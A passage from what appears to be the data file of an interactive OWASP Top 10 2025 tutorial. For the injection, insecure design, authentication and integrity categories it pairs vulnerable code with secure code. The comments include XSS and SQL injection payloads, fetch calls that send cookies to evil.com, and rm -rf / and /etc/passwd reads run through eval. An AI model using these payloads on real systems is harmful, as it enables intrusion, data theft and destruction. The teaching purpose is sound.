  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a05",
    code: "A05:2025",
    title: "Injection",
    prevCode: "A03:2021",
    prevTitle: "Injection",
    badge: { text: "Down from #3", type: "moved-down" },
    description:
      "Injection flaws allow attackers to insert malicious code into a program through its inputs. This includes SQL injection, NoSQL injection, OS command injection, LDAP injection, and Cross-Site Scripting (XSS).",
    comparison:
      'Dropped from <strong>#3 to #5</strong>, but remains one of the most actively exploited vulnerability classes. The decline in ranking reflects improved framework defaults (parameterized queries, auto-escaping templates) rather than reduced risk. XSS is explicitly included under Injection in both 2021 and 2025.',
    sandbox: {
      title: "DOM-Based XSS Search",
      description:
        'Type a search query below. The vulnerable version uses <code>innerHTML</code> to render results, allowing script injection. The secure version uses <code>textContent</code> and DOMPurify. Try entering: <code>&lt;img src=x onerror=alert("XSS")&gt;</code>',
      vulnerableLabel: "Vulnerable: innerHTML",
      secureLabel: "Secure: textContent + DOMPurify",
    },
    examples: [
      {
        title: "DOM-Based XSS via innerHTML",
        vulnerableCode: `<!-- Vulnerable: Using innerHTML with unsanitized input -->
<input type="text" id="search" placeholder="Search...">
<div id="results"></div>

<script>
  const input = document.getElementById('search');
  const results = document.getElementById('results');

  input.addEventListener('input', function() {
    const query = input.value;
    // DANGEROUS: Directly injecting user input into DOM
    results.innerHTML =
      '<p>Results for: <strong>' + query + '</strong></p>';

    // If a user types:
    //   <img src=x onerror=alert('XSS')>
    // The browser creates an <img> tag, the src fails,
    // and the onerror handler executes arbitrary JS.
  });
</script>`,
        secureCode: `<!-- Secure: Using textContent + DOMPurify -->
<input type="text" id="search" placeholder="Search...">
<div id="results"></div>

<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/
purify.min.js"></script>

<script>
  const input = document.getElementById('search');
  const results = document.getElementById('results');

  input.addEventListener('input', function() {
    const query = input.value;

    // Option 1: textContent (safest — no HTML parsing)
    results.textContent = 'Results for: ' + query;

    // Option 2: If you NEED HTML, sanitize first
    // const clean = DOMPurify.sanitize(query);
    // results.innerHTML =
    //   '<p>Results for: <strong>' + clean + '</strong></p>';

    // Both approaches neutralize the XSS payload.
    // <img src=x onerror=alert('XSS')> is rendered
    // as harmless visible text, not executed as HTML.
  });
</script>`,
      },
      {
        title: "SQL Injection",
        vulnerableCode: `// Vulnerable: String concatenation in SQL query
app.get('/api/users', (req, res) => {
  const username = req.query.username;

  // User input directly concatenated into SQL
  const query = "SELECT * FROM users WHERE username = '"
    + username + "'";

  db.execute(query);
});

// Normal request:
// GET /api/users?username=alice
// Query: SELECT * FROM users WHERE username = 'alice'

// Attack:
// GET /api/users?username=' OR '1'='1' --
// Query: SELECT * FROM users WHERE username = ''
//        OR '1'='1' --'
// Returns ALL users in the database!

// Destructive attack:
// GET /api/users?username='; DROP TABLE users; --
// Deletes the entire users table.`,
        secureCode: `// Secure: Parameterized queries (prepared statements)
app.get('/api/users', (req, res) => {
  const username = req.query.username;

  // Parameterized query — user input is NEVER part of SQL
  const query = 'SELECT * FROM users WHERE username = ?';
  db.execute(query, [username]);
});

// The database driver treats the parameter as DATA,
// never as SQL syntax. Even if the input contains:
//   ' OR '1'='1' --
// It searches for a user literally named:
//   "' OR '1'='1' --"
// ...which doesn't exist. No injection possible.

// Using an ORM (even safer):
const user = await User.findOne({
  where: { username: req.query.username }
});
// ORM handles parameterization automatically.

// Additional defenses:
// - Input validation (allowlist of characters)
// - Least privilege DB user (read-only where possible)
// - WAF rules for SQL injection patterns`,
      },
      {
        title: "URL / Link Injection (javascript: protocol)",
        vulnerableCode: `// Vulnerable: User-supplied URL rendered as href
function renderUserProfile(user) {
  const html = \`
    <div class="profile">
      <h2>\${user.name}</h2>
      <a href="\${user.website}">Visit Website</a>
    </div>
  \`;
  document.getElementById('profile').innerHTML = html;
}

// User submits their profile:
renderUserProfile({
  name: 'Attacker',
  website: "javascript:alert(document.cookie)"
});

// The link looks normal but when clicked:
// <a href="javascript:alert(document.cookie)">
// Executes JavaScript in the context of the page.
// Can also use: javascript:fetch('https://evil.com/steal'
//   + '?c=' + document.cookie)`,
        secureCode: `// Secure: URL validation + protocol allowlist
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    // Only allow safe protocols
    const allowedProtocols = ['https:', 'http:', 'mailto:'];
    if (!allowedProtocols.includes(parsed.protocol)) {
      return '#'; // Safe fallback
    }
    return parsed.href;
  } catch {
    return '#'; // Invalid URL → safe fallback
  }
}

function renderUserProfile(user) {
  const container = document.getElementById('profile');
  container.innerHTML = ''; // Clear previous content

  const h2 = document.createElement('h2');
  h2.textContent = user.name; // Safe: textContent

  const link = document.createElement('a');
  link.href = sanitizeUrl(user.website); // Validated URL
  link.textContent = 'Visit Website';
  link.rel = 'noopener noreferrer'; // Prevent tab-napping
  link.target = '_blank';

  container.append(h2, link);
}

// "javascript:alert(...)" → blocked (not http/https)
// "https://example.com" → allowed`,
      },
      {
        title: "Template Literal Injection",
        vulnerableCode: `// Vulnerable: Using eval / Function with template input
function renderTemplate(template, data) {
  // DANGEROUS: Creates a function from user-controlled string
  const fn = new Function('data',
    'return \`' + template + '\`'
  );
  return fn(data);
}

// Developer expects:
// renderTemplate('Hello \${data.name}!', { name: 'Alice' })
// → "Hello Alice!"

// Attacker submits as template:
// '\${(function(){ fetch("https://evil.com/?cookie="
//    + document.cookie); return "pwned"})()}'
//
// The Function constructor executes arbitrary code
// in the template string context.

// Even simpler attack:
// '\${constructor.constructor("return this")().process.exit()}'`,
        secureCode: `// Secure: Use a safe templating approach
function renderTemplate(template, data) {
  // Replace only known placeholders — no code execution
  return template.replace(
    /\\{\\{(\\w+)\\}\\}/g,
    (match, key) => {
      // Only allow known keys from the data object
      if (Object.hasOwn(data, key)) {
        return escapeHtml(String(data[key]));
      }
      return match; // Leave unknown placeholders as-is
    }
  );
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Usage with Mustache-style syntax (no code execution):
renderTemplate('Hello {{name}}!', { name: 'Alice' });
// → "Hello Alice!"

renderTemplate('Hello {{name}}!', {
  name: '<script>alert("XSS")</script>'
});
// → "Hello &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;!"
// HTML is escaped — safe to render.`,
      },
      {
        title: "eval() with User Input",
        vulnerableCode: `// Vulnerable: Using eval() to process user calculations
function calculate(expression) {
  // User types "2 + 3" into a calculator field
  // Developer uses eval for convenience
  return eval(expression);
}

// Expected usage:
// calculate("2 + 3")  → 5
// calculate("10 * 4") → 40

// Attack:
// calculate("fetch('https://evil.com/?d='+document.cookie)")
// → Sends cookies to attacker

// calculate("document.body.innerHTML = '<h1>Hacked</h1>'")
// → Defaces the page

// Worse — reading local files (Node.js context):
// calculate("require('fs').readFileSync('/etc/passwd','utf8')")
// calculate("require('child_process').execSync('rm -rf /')")`,
        secureCode: `// Secure: Parse and evaluate math safely — no eval()
function calculate(expression) {
  // Allowlist: only digits, operators, parentheses, decimals
  const sanitized = expression.replace(/\\s/g, '');

  if (!/^[\\d+\\-*/().]+$/.test(sanitized)) {
    throw new Error('Invalid expression');
  }

  // Use a safe math parser instead of eval
  return safeMathParse(sanitized);
}

// Simple recursive descent parser (no eval)
function safeMathParse(expr) {
  let pos = 0;

  function parseExpr() {
    let result = parseTerm();
    while (pos < expr.length && '+-'.includes(expr[pos])) {
      const op = expr[pos++];
      const right = parseTerm();
      result = op === '+' ? result + right : result - right;
    }
    return result;
  }

  function parseTerm() {
    let result = parseFactor();
    while (pos < expr.length && '*/'.includes(expr[pos])) {
      const op = expr[pos++];
      const right = parseFactor();
      result = op === '*' ? result * right : result / right;
    }
    return result;
  }

  function parseFactor() {
    if (expr[pos] === '(') {
      pos++; // skip (
      const result = parseExpr();
      pos++; // skip )
      return result;
    }
    const start = pos;
    while (pos < expr.length && /[\\d.]/.test(expr[pos])) pos++;
    return parseFloat(expr.slice(start, pos));
  }

  return parseExpr();
}`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A06: Insecure Design
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a06",
    code: "A06:2025",
    title: "Insecure Design",
    prevCode: "A04:2021",
    prevTitle: "Insecure Design",
    badge: { text: "Down from #4", type: "moved-down" },
    description:
      'Insecure Design represents architectural weaknesses — "missing or ineffective control design." Unlike implementation bugs, insecure design cannot be fixed by perfect coding alone. It requires threat modeling and secure design patterns from the start.',
    comparison:
      "Dropped from <strong>#4 to #6</strong>. Still a fundamental category emphasizing that security must be baked in at the design phase. The 2025 update reinforces the need for threat modeling, secure design patterns, and reference architectures rather than bolting on security after the fact.",
    sandbox: {
      title: "Business Logic Bypass — Coupon Abuse",
      description:
        'A poorly designed e-commerce checkout lets users apply the same discount coupon unlimited times. The secure version tracks used coupons and enforces single-use. Try applying the coupon "SAVE20" multiple times.',
      vulnerableLabel: "Vulnerable: No Usage Limit",
      secureLabel: "Secure: Single-Use Enforcement",
    },
    examples: [
      {
        title: "Unlimited Coupon Abuse",
        vulnerableCode: `// Vulnerable: No server-side coupon usage tracking
let cartTotal = 100.00;

function applyCoupon(code) {
  // No check if coupon was already used!
  if (code === 'SAVE20') {
    cartTotal -= 20;
    updateDisplay();
    return { success: true, message: 'Coupon applied! -$20' };
  }
  return { success: false, message: 'Invalid coupon' };
}

// User can call applyCoupon('SAVE20') repeatedly:
// Call 1: $100 → $80
// Call 2: $80  → $60
// Call 3: $60  → $40
// Call 4: $40  → $20
// Call 5: $20  → $0   ← FREE ITEMS!
// Call 6: $0   → -$20 ← STORE OWES THE USER!`,
        secureCode: `// Secure: Coupon usage tracking + validation
let cartTotal = 100.00;
const usedCoupons = new Set();
const MINIMUM_TOTAL = 0;

function applyCoupon(code) {
  // Check 1: Has this coupon already been used?
  if (usedCoupons.has(code)) {
    return {
      success: false,
      message: 'Coupon already used in this order.'
    };
  }

  // Check 2: Validate the coupon
  const coupons = { 'SAVE20': 20, 'SAVE10': 10 };
  const discount = coupons[code];
  if (!discount) {
    return { success: false, message: 'Invalid coupon code.' };
  }

  // Check 3: Ensure total won't go below minimum
  if (cartTotal - discount < MINIMUM_TOTAL) {
    return {
      success: false,
      message: 'Discount exceeds remaining total.'
    };
  }

  // Apply and record usage
  cartTotal -= discount;
  usedCoupons.add(code);
  updateDisplay();
  return { success: true, message: \`Coupon applied! -$\${discount}\` };
}`,
      },
      {
        title: "Unrestricted Password Reset",
        vulnerableCode: `// Vulnerable: Password reset with no rate limit or verification
app.post('/api/reset-password', (req, res) => {
  const { email } = req.body;

  // Generate a simple numeric code
  const code = Math.floor(100000 + Math.random() * 900000);

  // Store code with no expiration
  resetCodes[email] = code;

  sendEmail(email, 'Your reset code: ' + code);
  res.json({ message: 'Code sent.' });
});

app.post('/api/verify-reset', (req, res) => {
  const { email, code, newPassword } = req.body;

  // No attempt limit! Attacker brute-forces 000000-999999
  if (resetCodes[email] == code) {
    users[email].password = newPassword; // No complexity check
    res.json({ message: 'Password changed!' });
  }
});

// Attacker: 1 million guesses at ~1000/sec = 17 minutes
// to take over any account.`,
        secureCode: `// Secure: Rate-limited reset with expiring token
app.post('/api/reset-password', rateLimit({
  windowMs: 15 * 60 * 1000, max: 3 // 3 requests per 15 min
}), async (req, res) => {
  const { email } = req.body;

  // Generate cryptographically secure token (not numeric)
  const token = crypto.randomBytes(32).toString('hex');

  await db.resetTokens.create({
    email,
    token: await hashToken(token),
    expiresAt: new Date(Date.now() + 15 * 60 * 1000), // 15 min
    attempts: 0
  });

  sendEmail(email, \`https://app.com/reset?token=\${token}\`);
  // Always return success (don't leak if email exists)
  res.json({ message: 'If the email exists, a link was sent.' });
});

app.post('/api/verify-reset', async (req, res) => {
  const { token, newPassword } = req.body;

  const record = await db.resetTokens.findByHashedToken(token);
  if (!record || record.expiresAt < new Date()) {
    return res.status(400).json({ error: 'Invalid or expired' });
  }
  if (record.attempts >= 3) {
    return res.status(429).json({ error: 'Too many attempts' });
  }

  // Enforce password complexity
  if (!isStrongPassword(newPassword)) {
    return res.status(400).json({ error: 'Weak password' });
  }

  await changePassword(record.email, newPassword);
  await db.resetTokens.delete(record.id); // One-time use
});`,
      },
      {
        title: "No CAPTCHA on Sensitive Forms",
        vulnerableCode: `<!-- Vulnerable: Registration form with no bot protection -->
<form action="/api/register" method="POST">
  <input name="email" type="email" required>
  <input name="password" type="password" required>
  <button type="submit">Create Account</button>
</form>

<!-- No CAPTCHA, no rate limiting, no email verification -->

<!--
  An attacker can script account creation:
  for (let i = 0; i < 10000; i++) {
    fetch('/api/register', {
      method: 'POST',
      body: JSON.stringify({
        email: 'spam' + i + '@tempmail.com',
        password: 'password123'
      })
    });
  }

  Result:
  - 10,000 fake accounts created instantly
  - Used for spam, abuse, fake reviews
  - Overwhelms database and support team
  - No way to distinguish real users from bots
-->`,
        secureCode: `<!-- Secure: Multi-layered bot protection -->
<form action="/api/register" method="POST" id="regForm">
  <input name="email" type="email" required>
  <input name="password" type="password" required>

  <!-- Invisible honeypot field (bots fill it, humans don't) -->
  <input name="website" type="text" style="display:none"
         tabindex="-1" autocomplete="off">

  <!-- reCAPTCHA v3 (invisible, score-based) -->
  <div id="recaptcha"></div>

  <button type="submit">Create Account</button>
</form>

<script>
  // Server-side validation:
  app.post('/api/register',
    rateLimit({ windowMs: 60000, max: 5 }), // 5/minute
    async (req, res) => {
      // Check honeypot
      if (req.body.website) {
        return res.status(200).json({ ok: true }); // Trick bot
      }

      // Verify CAPTCHA
      const score = await verifyCaptcha(req.body.captchaToken);
      if (score < 0.5) {
        return res.status(403).json({ error: 'Bot detected' });
      }

      // Require email verification before activation
      const user = await createUser(req.body);
      await sendVerificationEmail(user.email);
      res.json({ message: 'Check your email to verify.' });
    }
  );
</script>`,
      },
      {
        title: "Predictable Resource Identifiers",
        vulnerableCode: `// Vulnerable: Sequential/predictable IDs for sensitive data
function createOrder(userId, items) {
  const orderId = lastOrderId + 1; // Sequential integer
  lastOrderId = orderId;

  return db.orders.create({
    id: orderId,  // 1001, 1002, 1003...
    userId,
    items,
    invoice: '/invoices/INV-' + orderId + '.pdf'
  });
}

// Attacker can enumerate:
// /api/orders/1001 → their order
// /api/orders/1000 → previous customer's order
// /api/orders/999  → another customer's order
// ...
// /api/orders/1    → first order ever placed

// Also reveals business intelligence:
// "The site has had 1001 orders total"
// "They get ~50 orders/day based on ID growth"`,
        secureCode: `// Secure: Unpredictable UUIDs for resource identifiers
function createOrder(userId, items) {
  const orderId = crypto.randomUUID();
  // "f47ac10b-58cc-4372-a567-0e02b2c3d479"

  return db.orders.create({
    id: orderId,
    userId,
    items,
    invoice: '/invoices/' + orderId + '.pdf'
  });
}

// Attacker cannot enumerate:
// /api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d479 → valid
// /api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d480 → 404
// There are 2^122 possible UUIDs — not brute-forceable.

// Combined with ownership checks (defense in depth):
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: 'Not found' });
    // 404 (not 403) — don't reveal if the ID exists
  }
  res.json(order);
});`,
      },
      {
        title: "No Re-authentication for Sensitive Actions",
        vulnerableCode: `// Vulnerable: Critical actions use only the session cookie
app.post('/api/account/change-email', authenticate, (req, res) => {
  // Only checks if user is logged in — no re-auth!
  const { newEmail } = req.body;
  db.users.update(req.user.id, { email: newEmail });
  res.json({ message: 'Email changed.' });
});

app.post('/api/account/change-password', authenticate, (req, res) => {
  // Doesn't ask for current password!
  const { newPassword } = req.body;
  db.users.update(req.user.id, { password: newPassword });
  res.json({ message: 'Password changed.' });
});

// If an attacker steals the session (XSS, shared computer):
// 1. Change email to attacker@evil.com
// 2. Change password to anything
// 3. Original user is permanently locked out
// 4. Attacker owns the account`,
        secureCode: `// Secure: Re-authenticate before sensitive actions
app.post('/api/account/change-email',
  authenticate,
  async (req, res) => {
    const { newEmail, currentPassword } = req.body;

    // Require current password for sensitive changes
    const isValid = await verifyPassword(
      currentPassword, req.user.passwordHash
    );
    if (!isValid) {
      return res.status(403).json({
        error: 'Current password required.'
      });
    }

    // Verify new email via confirmation link
    const token = crypto.randomBytes(32).toString('hex');
    await db.emailChanges.create({
      userId: req.user.id,
      newEmail,
      token: await hashToken(token),
      expiresAt: new Date(Date.now() + 3600000)
    });

    // Send confirmation to BOTH old and new email
    await sendEmail(req.user.email,
      'Someone requested an email change for your account.');
    await sendEmail(newEmail,
      \`Confirm your new email: .../confirm?token=\${token}\`);

    res.json({ message: 'Confirmation sent to new email.' });
  }
);`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A07: Authentication Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a07",
    code: "A07:2025",
    title: "Authentication Failures",
    prevCode: "A07:2021",
    prevTitle: "Identification and Authentication Failures",
    badge: { text: "Same #7", type: "same" },
    description:
      "Authentication Failures allow attackers to compromise passwords, keys, or session tokens. This covers brute force, credential stuffing, weak passwords, missing MFA, and improper session management.",
    comparison:
      'Renamed from "Identification and Authentication Failures" for simplicity. Position unchanged at <strong>#7</strong>. The 2025 version continues to stress the importance of multi-factor authentication, strong password policies, and rate limiting as baseline requirements.',
    sandbox: {
      title: "Brute Force Login Simulation",
      description:
        'This simulates a login form attacked with common passwords. The vulnerable version has no rate limiting — the attacker can try unlimited passwords. The secure version locks the account after 3 failed attempts. <br>The password is <code>dragon</code>. Watch the automated brute-force attack.',
      vulnerableLabel: "Vulnerable: No Rate Limiting",
      secureLabel: "Secure: Account Lockout",
    },
    examples: [
      {
        title: "No Rate Limiting / Brute Force",
        vulnerableCode: `// Vulnerable: No rate limiting or lockout
const users = { admin: 'dragon' };

function login(username, password) {
  // No attempt counting, no delay, no lockout
  if (users[username] === password) {
    return { success: true, message: 'Login successful!' };
  }
  return { success: false, message: 'Invalid credentials.' };
}

// An attacker can try thousands of passwords:
const commonPasswords = [
  '123456', 'password', 'admin', 'letmein',
  'welcome', 'monkey', 'dragon', // ← will succeed
  'master', 'qwerty', 'login'
];

// No throttling — all attempts are instant
commonPasswords.forEach(pw => {
  const result = login('admin', pw);
  if (result.success) {
    console.log('CRACKED! Password is: ' + pw);
  }
});`,
        secureCode: `// Secure: Rate limiting + account lockout
const users = { admin: 'dragon' };
const attempts = {};
const MAX_ATTEMPTS = 3;
const LOCKOUT_MS = 30000; // 30-second lockout

function login(username, password) {
  if (!attempts[username]) {
    attempts[username] = { count: 0, lockedUntil: 0 };
  }
  const record = attempts[username];

  // Check if account is locked
  if (Date.now() < record.lockedUntil) {
    const remaining = Math.ceil(
      (record.lockedUntil - Date.now()) / 1000
    );
    return {
      success: false,
      message: \`Account locked. Try again in \${remaining}s.\`
    };
  }

  if (users[username] === password) {
    record.count = 0;
    return { success: true, message: 'Login successful!' };
  }

  record.count++;
  if (record.count >= MAX_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCKOUT_MS;
    return {
      success: false,
      message: 'Too many attempts. Account locked for 30s.'
    };
  }

  return {
    success: false,
    message: \`Invalid. \${MAX_ATTEMPTS - record.count} attempts left.\`
  };
}`,
      },
      {
        title: "Weak Password Policy",
        vulnerableCode: `// Vulnerable: No password requirements
function register(username, password) {
  // Accepts ANY password — even empty strings
  if (!username || !password) {
    return { error: 'Username and password required.' };
  }

  // These all work:
  // register('admin', '1')            → 1 character
  // register('admin', 'password')     → most common password
  // register('admin', 'admin')        → same as username
  // register('admin', '123456')       → in every breach list
  // register('admin', 'aaa')          → no complexity at all

  db.users.create({ username, password });
  return { success: true };
}

// With no policy, 81% of breaches involve weak passwords.
// Credential stuffing uses leaked password lists
// that are 99% effective against weak-policy sites.`,
        secureCode: `// Secure: Comprehensive password policy
const COMMON_PASSWORDS = new Set(
  // Load top 100,000 breached passwords
  require('./common-passwords.json')
);

function validatePassword(password, username) {
  const errors = [];

  if (password.length < 12) {
    errors.push('Minimum 12 characters required.');
  }
  if (password.length > 128) {
    errors.push('Maximum 128 characters.');
  }
  if (password.toLowerCase().includes(username.toLowerCase())) {
    errors.push('Password cannot contain your username.');
  }
  if (COMMON_PASSWORDS.has(password.toLowerCase())) {
    errors.push('This password is too common (in breach lists).');
  }
  if (!/[a-z]/.test(password) || !/[A-Z]/.test(password)) {
    errors.push('Include both uppercase and lowercase letters.');
  }
  if (!/\\d/.test(password)) {
    errors.push('Include at least one number.');
  }

  return { valid: errors.length === 0, errors };
}

function register(username, password) {
  const validation = validatePassword(password, username);
  if (!validation.valid) {
    return { error: validation.errors };
  }
  const hashed = await bcrypt.hash(password, 12);
  db.users.create({ username, password: hashed });
  return { success: true };
}`,
      },
      {
        title: "Session Fixation",
        vulnerableCode: `// Vulnerable: Session ID not regenerated after login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = authenticate(username, password);

  if (user) {
    // Reuses the EXISTING session ID
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  }
});

// Attack scenario:
// 1. Attacker visits the site → gets session ID "abc123"
// 2. Attacker sends victim a link:
//    https://app.com/login?sessionId=abc123
// 3. Victim clicks link, logs in
// 4. Victim's session uses ID "abc123" (not regenerated)
// 5. Attacker already knows session ID "abc123"
// 6. Attacker uses "abc123" → is now logged in as victim`,
        secureCode: `// Secure: Regenerate session ID on login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = authenticate(username, password);

  if (user) {
    // Destroy the old session and create a new one
    const oldSession = req.session;
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: 'Session error' });
      }
      // Copy non-sensitive data to new session
      req.session.userId = user.id;
      req.session.role = user.role;
      req.session.createdAt = Date.now();

      // Secure cookie settings
      req.session.cookie.secure = true;    // HTTPS only
      req.session.cookie.httpOnly = true;  // No JS access
      req.session.cookie.sameSite = 'strict';
      req.session.cookie.maxAge = 3600000; // 1 hour

      res.json({ success: true });
    });
  }
});

// Old session ID "abc123" is invalidated.
// New session ID "xyz789" is generated.
// Attacker's "abc123" is useless.`,
      },
      {
        title: "No Multi-Factor Authentication",
        vulnerableCode: `// Vulnerable: Single-factor (password only) login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findByEmail(email);

  if (user && await verifyPassword(password, user.hash)) {
    // Immediately grants full access with just a password
    const token = generateSessionToken();
    res.json({ token, user: { id: user.id, name: user.name } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// A compromised password = full account takeover
// Passwords can be stolen via:
// - Phishing emails
// - Data breaches (password reuse)
// - Keyloggers / malware
// - Shoulder surfing
// - Social engineering
// Once stolen, nothing stops the attacker.`,
        secureCode: `// Secure: TOTP-based Multi-Factor Authentication
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findByEmail(email);

  if (!user || !await verifyPassword(password, user.hash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // If MFA is enabled, require second factor
  if (user.mfaEnabled) {
    const challenge = crypto.randomBytes(32).toString('hex');
    await db.mfaChallenges.create({
      userId: user.id,
      challenge,
      expiresAt: new Date(Date.now() + 300000) // 5 min
    });
    return res.json({ requiresMFA: true, challenge });
  }

  issueSession(user, res);
});

app.post('/login/mfa', async (req, res) => {
  const { challenge, totpCode } = req.body;
  const record = await db.mfaChallenges.findValid(challenge);
  if (!record) {
    return res.status(401).json({ error: 'Invalid challenge' });
  }

  const user = await db.users.findById(record.userId);
  // Verify TOTP code (time-based one-time password)
  const isValid = verifyTOTP(user.mfaSecret, totpCode);

  if (!isValid) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }

  await db.mfaChallenges.delete(record.id);
  issueSession(user, res);
});`,
      },
      {
        title: "Insecure Password Recovery",
        vulnerableCode: `// Vulnerable: Security questions for password recovery
app.post('/api/recover', (req, res) => {
  const { email, mothersMaidenName, petName } = req.body;
  const user = db.users.findByEmail(email);

  if (!user) {
    // Leaks whether the email exists!
    return res.status(404).json({ error: 'Email not found.' });
  }

  // Security questions are trivially guessable
  if (user.mothersMaidenName === mothersMaidenName
      && user.petName === petName) {
    // Immediately resets password — no email verification!
    const newPassword = 'TempPass123';
    user.password = newPassword;
    res.json({ newPassword });
    // Sends the new password in the response! (plaintext)
  }
});

// Problems:
// 1. Security questions answerable from social media
// 2. No email verification — attacker resets directly
// 3. Reveals if email is registered (account enumeration)
// 4. New password sent in response body (interceptable)`,
        secureCode: `// Secure: Token-based recovery via email
app.post('/api/recover', rateLimit({ max: 3, windowMs: 900000 }),
  async (req, res) => {
    const { email } = req.body;

    // Always return the same response (prevent enumeration)
    res.json({ message: 'If registered, a reset link was sent.' });

    const user = await db.users.findByEmail(email);
    if (!user) return; // Don't reveal non-existence

    // Generate secure one-time token
    const token = crypto.randomBytes(32).toString('hex');
    await db.resetTokens.create({
      userId: user.id,
      tokenHash: await hashToken(token),
      expiresAt: new Date(Date.now() + 900000), // 15 min
      used: false
    });

    // Send reset link to the registered email
    await sendEmail(email, {
      subject: 'Password Reset Request',
      body: \`Click to reset: https://app.com/reset?token=\${token}
             This link expires in 15 minutes.
             If you didn't request this, ignore this email.\`
    });

    // Log the recovery attempt
    securityLogger.info({
      event: 'PASSWORD_RESET_REQUESTED',
      email: maskEmail(email)
    });
  }
);`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A08: Software or Data Integrity Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a08",
    code: "A08:2025",
    title: "Software or Data Integrity Failures",
    prevCode: "A08:2021",
    prevTitle: "Software and Data Integrity Failures",
    badge: { text: "Same #8", type: "same" },
    description:
      "Integrity Failures occur when code or data is used without verifying its authenticity. This includes insecure deserialization, CI/CD pipeline compromises, and auto-updates without signature verification.",
    comparison:
      'Position unchanged at <strong>#8</strong>. Minor rename from "and" to "or." The 2025 version maintains focus on insecure deserialization, unsigned updates, and untrusted data in critical decisions, but puts additional emphasis on CI/CD integrity in the context of the broader supply chain landscape.',
    sandbox: {
      title: "Unsafe Deserialization",
      description:
        'Simulate processing a serialized user profile object. The vulnerable version blindly executes data from an untrusted source. The secure version validates the schema and rejects unexpected properties.',
      vulnerableLabel: "Vulnerable: Blind eval()",
      secureLabel: "Secure: Schema Validation",
    },
    examples: [
      {
        title: "Insecure Deserialization via eval()",
        vulnerableCode: `// Vulnerable: Using eval() to deserialize data
function loadUserProfile(serializedData) {
  // DANGEROUS: eval() executes arbitrary code
  const profile = eval('(' + serializedData + ')');
  return profile;
}

// Normal input works fine:
// loadUserProfile('{"name":"Alice","role":"user"}')

// But an attacker sends:
const malicious = \`{
  name: (function(){
    fetch('https://evil.com/steal?cookies='
      + document.cookie);
    return 'hacked';
  })(),
  role: "admin"
}\`;

const profile = loadUserProfile(malicious);
// The function executes, cookies are stolen,
// and the attacker gets admin access.`,
        secureCode: `// Secure: JSON.parse + schema validation
const PROFILE_SCHEMA = {
  name:  { type: 'string', maxLength: 100 },
  email: { type: 'string', maxLength: 254 },
  role:  { type: 'string', enum: ['user', 'editor'] }
};

function loadUserProfile(serializedData) {
  let parsed;
  try {
    // JSON.parse is safe — it cannot execute code
    parsed = JSON.parse(serializedData);
  } catch (e) {
    throw new Error('Invalid JSON format');
  }

  const validated = {};
  for (const [key, rules] of Object.entries(PROFILE_SCHEMA)) {
    const value = parsed[key];
    if (value === undefined) continue;
    if (typeof value !== rules.type) {
      throw new Error(\`Invalid type for \${key}\`);
    }
    if (rules.maxLength && value.length > rules.maxLength) {
      throw new Error(\`\${key} exceeds max length\`);
    }
    if (rules.enum && !rules.enum.includes(value)) {
      throw new Error(\`Invalid value for \${key}\`);
    }
    validated[key] = value;
  }

  return validated;
}`,
      },
      {
        title: "Auto-Update Without Signature Verification",
        vulnerableCode: `// Vulnerable: Auto-update with no signature check
async function checkForUpdate() {
  const response = await fetch(
    'https://updates.example.com/latest.json'
  );
  const update = await response.json();

  if (update.version > currentVersion) {
    // Downloads and executes with no verification!
    const binary = await fetch(update.downloadUrl);
    const blob = await binary.blob();
    installUpdate(blob);
  }
}

// If the update server is compromised, or if an attacker
// performs a MITM attack (DNS hijack, BGP hijack):
// 1. Attacker serves malicious latest.json
// 2. Points downloadUrl to malware
// 3. App downloads and installs malware
// 4. All users running auto-update are compromised
// Real-world: SolarWinds Orion supply chain attack`,
        secureCode: `// Secure: Signed updates with public key verification
const PUBLIC_KEY = \`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
-----END PUBLIC KEY-----\`;

async function checkForUpdate() {
  const response = await fetch(
    'https://updates.example.com/latest.json'
  );
  const update = await response.json();

  if (update.version <= currentVersion) return;

  // Download the update AND its signature
  const binary = await fetch(update.downloadUrl);
  const signature = await fetch(update.signatureUrl);

  const data = await binary.arrayBuffer();
  const sig = await signature.arrayBuffer();

  // Verify the signature using the embedded public key
  const key = await crypto.subtle.importKey(
    'spki', pemToBuffer(PUBLIC_KEY),
    { name: 'RSA-PSS', hash: 'SHA-256' }, false, ['verify']
  );

  const isValid = await crypto.subtle.verify(
    { name: 'RSA-PSS', saltLength: 32 },
    key, sig, data
  );

  if (!isValid) {
    securityLogger.critical('Update signature invalid!');
    throw new Error('Update verification failed');
  }

  // Also verify the hash matches what's in the manifest
  const hash = await crypto.subtle.digest('SHA-256', data);
  if (bufToHex(hash) !== update.sha256) {
    throw new Error('Hash mismatch');
  }

  installUpdate(new Blob([data]));
}`,
      },
      {
        title: "Client-Side Price Tampering",
        vulnerableCode: `// Vulnerable: Price stored in hidden form field / client state
<form action="/api/checkout" method="POST">
  <input type="hidden" name="productId" value="WIDGET-001">
  <input type="hidden" name="price" value="49.99">
  <input type="number" name="quantity" value="1">
  <button type="submit">Buy Now - $49.99</button>
</form>

